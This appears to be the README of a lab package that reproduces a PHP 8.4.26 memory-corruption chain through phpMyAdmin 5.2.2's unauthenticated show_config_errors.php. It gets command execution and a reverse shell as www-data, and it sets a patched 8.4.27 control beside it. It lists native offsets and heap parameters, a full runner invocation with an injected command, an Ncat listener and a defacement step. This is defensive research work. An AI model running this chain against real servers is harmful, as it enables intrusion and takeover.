# PHP2Shell on phpMyAdmin 5.2.2 / PHP 8.4.26

Reproduces the PHP core CVE-2026-109618 / CVE-2026-109619 family through a PHP
file that phpMyAdmin 5.2.2 ships without auth. It isn't a new phpMyAdmin bug,
it doesn't work against PHP generally, and it won't run against anything that
isn't loopback.

The target is the bundled phpMyAdmin lab on `127.0.0.1:18212`. A PHP 8.4.27
target comes up next to it on `127.0.0.1:18213` as a control, and the same
request fails against that one. The runner refuses non-loopback URLs and makes
you acknowledge the build profile before it will fire.

## What it does

- phpMyAdmin 5.2.2 from the official all-languages archive
- PHP 8.4.26, Apache 2.4.69 `mod_php`, prefork
- stock `memory_limit=128M`, `post_max_size=8M`, 150-worker pool
- goes in through `/show_config_errors.php`, no auth needed
- the `Host` header drives the allocation
- 149 unfinished blockers for the command and readback proof
- ZendMM and `libphp` bases read out of the HTTP responses
- `zif_system=0x465370`, `zval_ptr_dtor=0x65eb60`, table landing `0x690d8`
- command marker read back two ways, over HTTP and off the filesystem, as
  `www-data`
- a real Bash callback as `www-data`, UID/GID 33, from `/var/www/html`
- on PHP 8.4.27: an ordinary 32-byte cookie, no pointer clusters, no dispatch,
  no proof file

You get the web server account, not root.

## Requirements

- Windows PowerShell
- Docker Desktop on Linux containers
- Python 3
- Ncat at `C:\Program Files (x86)\Nmap\ncat.exe`

The first build needs network access unless the pinned base images and the
phpMyAdmin archive are already cached. The Dockerfiles pin the PHP and MariaDB
images by digest and check the phpMyAdmin archive against its SHA-256 before
extracting. Everything stays on loopback and a private Docker network.

## Running it

Two PowerShell windows. In the left one:

```powershell
.\START-LAB.cmd
```

Open both URLs it prints. They should both show a normal phpMyAdmin login page:

- vulnerable: `http://127.0.0.1:18212/`
- control: `http://127.0.0.1:18213/`

Then reuse that window for the listener:

```powershell
.\LISTEN.cmd
```

In the right window:

```powershell
.\EXPLOIT.cmd
```

Wait for the shell, then type your own commands. [`VIDEO-DEMO.md`](VIDEO-DEMO.md)
has the short sequence used in the recording. Refresh the vulnerable page to
see the manual `NADSEC / PWNED` change, then refresh the 8.4.27 page to see it
unaffected.

```powershell
.\STOP-LAB.cmd
```

## Without the shell

The command and readback proof runs on its own:

```powershell
python .\prior-art-php2shell-joas\stock_phpmyadmin_gate.py `
  --url http://127.0.0.1:18212/show_config_errors.php `
  --host-header x `
  --blockers 149 `
  --settle 10 `
  --cmd 'id>x29' `
  --fetch /x29 `
  --expect 'uid=' `
  --leak-tries 3 `
  --fire-tries 6 `
  --timeout 180 `
  --ack-exact-profile
```

The vulnerable receipt records `rce_proved` on the first fire attempt with all
149 blockers still alive. The 8.4.27 receipt records `leak_failed`, zero
decoded pointer clusters, and no marker.

The control is also runnable on its own after `START-LAB.cmd`:

```powershell
.\FIXED-CONTROL.cmd
```

It passes only when 8.4.27 returns the leak denial, writes no proof file, and
keeps serving a healthy login page.

## Retained-socket load variant

[`keepalive-load/`](keepalive-load/) keeps Leak and Fire on one HTTP/1.1 socket
and uses the stock-live profile instead: 800x31 live carriers, four fillers,
late progress, table offset `0xb30d8`. No worker blockers.

Measured under concurrent background GETs:

- concurrency 1: 3/3 command proofs, 250/250 background requests got HTTP 200
- concurrency 5: 3/3 command proofs, 1,132/1,132 got HTTP 200
- zero background transport errors
- PHP 8.4.27: three leak denials, no Fire, marker still 404, health 200

```powershell
python .\keepalive-load\verify_pma_keepalive_load.py
```

Expect `PMA_KEEPALIVE_STOCK_LIVE_LOAD_RCE_PASS`. The saved receipts that
verifier checks against are not in this repo; they're kept with the full
research bundle offline.

This shows command execution under ordinary concurrent load on this profile.
It isn't a second reverse-shell result and it doesn't widen where the chain
works.

## Where this stops working

The chain is calibrated to this application route, module build, memory
limits, Host geometry, Apache worker model, native offsets and heap landing. A
different PHP build, SAPI, extension set, route, virtual-host policy or
allocator layout needs its own validation, and will most likely fail safely
before it dispatches.

The runner wraps a hash-pinned third-party research engine, kept at
[`q618-stock-gate-20261024/thecybergeek-read-only/engine.py`](q618-stock-gate-20261024/thecybergeek-read-only/engine.py).
`stock_phpmyadmin_gate.py` checks its SHA-256 and refuses to run if it doesn't
match. I didn't discover any of this. It reproduces public PHP core bugs
through one representative application.

## What's in here

- `START-LAB.cmd` / `STOP-LAB.cmd` create, reset and stop the two Docker labs
- `LISTEN.cmd` starts the local Ncat listener
- `EXPLOIT.cmd` runs the loopback shell chain
- `FIXED-CONTROL.cmd` reproduces the 8.4.27 denial
- `VIDEO-DEMO.md` is the recording sequence
- `verify_package.py` is the offline verifier
- `keepalive-load/` is the retained-socket chain, load matrix and verifier
- `prior-art-php2shell-joas/` holds the gate, the shell runner and the Docker
  labs
- `prior-art-php2shell-joas/evidence/` holds the console records and checksum
  manifests that `verify_package.py` checks
- `q618-stock-gate-20261024/` holds the pinned engine snapshot
